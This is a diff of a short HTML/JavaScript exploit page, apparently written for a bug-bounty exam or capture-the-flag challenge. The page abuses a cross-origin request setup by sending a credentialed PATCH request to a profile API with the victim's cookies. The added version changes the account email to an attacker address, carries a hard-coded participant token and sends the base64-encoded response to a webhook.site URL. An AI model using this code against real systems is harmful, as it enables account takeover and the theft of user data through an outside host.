@@ -1,38 +1,27 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        // The target API endpoint
-        const url = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
+<script>
+    const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
+    const data = JSON.stringify({
+        "fullName": "Admin_Pwned",
+        "email": "hacker@evil.com", // Try changing the email to your own
+        "address": {
+            "street": "123 Main Street",
+            "city": "Tripoli",
+            "state": "New York",
+            "zipCode": "33601",
+            "country": "United States"
+        }
+    });
 
-        fetch(url, {
-            method: "PATCH",
-            headers: {
-                "Content-Type": "application/json",
-                // Note: We don't need the X-Participant-Token 
-                // if the server only validates the Cookie.
-            },
-            body: JSON.stringify({
-                "fullName": "CORS",
-                "phoneNumber": "(133) 713-3700",
-                "address": {
-                    "street": "Vulnerable Way",
-                    "city": "Tripoli",
-                    "state": "New York",
-                    "zipCode": "33601",
-                    "country": "United States"
-                }
-            }),
-            // This is the "magic" that sends the user's login cookies
-            credentials: "include" 
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log("Success! Profile modified. Data:", data);
-            // If there's a flag in the response, alert it!
-            alert("Flag Found: " + JSON.stringify(data));
-        })
-        .catch(err => console.error("Exploit failed:", err));
-    </script>
-</body>
-</html>
+    fetch(target, {
+        method: "PATCH",
+        headers: {
+            "Content-Type": "application/json",
+            "X-Participant-Token": "pt_1b3dc783f60b2febc8ec1cf75e880aac9d1d62c19b7fae1f0a143d6afbeb858c_7a3b42e022441584"
+        },
+        body: data,
+        credentials: "include"
+    }).then(r => r.json()).then(res => {
+        // Send the response (and flag!) to a webhook so you can see it
+        fetch("https://webhook.site/YOUR_ID?flag=" + btoa(JSON.stringify(res)));
+    });
+</script>
